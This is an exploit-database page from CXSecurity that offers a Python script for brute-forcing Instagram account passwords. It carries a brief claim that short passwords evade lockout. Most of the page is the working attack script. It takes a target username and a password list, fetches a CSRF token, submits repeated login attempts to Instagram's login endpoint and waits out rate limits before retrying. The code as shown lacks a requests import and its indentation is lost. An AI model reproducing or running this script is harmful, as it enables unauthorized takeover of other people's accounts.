---
title: Instagram Brute Force Attack Using Python
url: https://cxsecurity.com/issue/WLB-2023040057
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-16
fetch_date: 2025-10-04T11:31:51.536185
---

# Instagram Brute Force Attack Using Python

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Instagram Brute Force Attack Using Python** **2023.04.15**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [E1.Coders](https://cxsecurity.com/author/E1.Coders/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** site:instagram.com inurl:login](https://cxsecurity.com/dorks/)** | |

With this script, you can easily perform an Instagram Brute Force attack using Python
If you notice that Instagram has less than 6 passwords, it will always accept your password input
If you ask me "is it vulnerable?" I totally said no, I think the Instagram developer was very smart to create this login feature. So when the input is more than six characters, the login page will process it to check if the password is correct or not. And if you enter the wrong password three or five times, we have to wait a few minutes to re-enter it.
No, we see that if we can enter passwords under six characters, we can do this over and over and over as many times as we want without waiting a few minutes. This is a big reason why this script was created 😏
# Created by Ahmad Bayati
import argparse
import os
import codecs
import time
base\_url = 'https://www.instagram.com'
user\_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'
def user\_exists(username):
return requests.get(f'{base\_url}/{username}', headers={
'user-agent': user\_agent
}).status\_code != 404
def clean\_list(items):
new\_list = []
for item in items:
if item and item not in new\_list:
new\_list.append(item)
return new\_list
def countdown(t):
while t:
mins, secs = divmod(t, 60)
print(f'{mins:02d}:{secs:02d}', end='\r')
time.sleep(1)
t -= 1
parser = argparse.ArgumentParser()
parser.add\_argument('username', help='Instagram username of the user you want to attack')
parser.add\_argument('passwords\_file', help='A passwords file for the software')
args = parser.parse\_args()
if not os.path.exists(args.passwords\_file):
exit(f'[\*] Sorry, can\'t find file named "{args.passwords\_file}"')
else:
with codecs.open(args.passwords\_file, 'r', 'utf-8') as file:
passwords = clean\_list(file.read().splitlines())
if len(passwords) < 1:
exit('[\*] The file is empty')
else:
print(f'[\*] {len(passwords)} passwords loaded successfully')
if not user\_exists(args.username):
exit(f'[\*] Sorry, can\'t find user named "{args.username}"')
tries\_counter = 0
for password in passwords:
tries\_counter += 1
sess = requests.Session()
csrftoken = requests.get(base\_url).cookies['csrftoken']
login\_req = sess.post(f'{base\_url}/accounts/login/ajax/', headers={
'origin': 'https://www.instagram.com',
'pragma': 'no-cache',
'referer': 'https://www.instagram.com/accounts/login/',
'user-agent': user\_agent,
'x-csrftoken': csrftoken,
'x-requested-with': 'XMLHttpRequest'
}, data={
'username': args.username,
'password': password,
'queryParams': '{}'
})
print(login\_req.text)
# or 'checkpoint\_required' in login\_req.text
if '"authenticated": true' in login\_req.text:
print(f'[\*] Login success {[args.username, password]}')
break
else:
print(f'[{tries\_counter}] Can\'t login with "{password}"')
if '"authenticated": false' in login\_req.text:
pass
elif 'Please wait a few minutes before you try again.' in login\_req.text:
print('[\*] You should wait 10 minutes')
countdown(600)
# we want to try again, i know that this the most lazy way to fix that
passwords.insert(tries\_counter, password)
else:
exit(f'Unknown error, Open an issue on github with this content "{login\_req.text}" and more details please')
input('[\*] Press enter to exit')

**##### References:**

https://www.sololearn.com/compiler-playground/ce9psOCM3mAc

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040057)

[Tweet](https://twitter.com/share)

Vote for this issue:
 14
 -1

93%

7%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top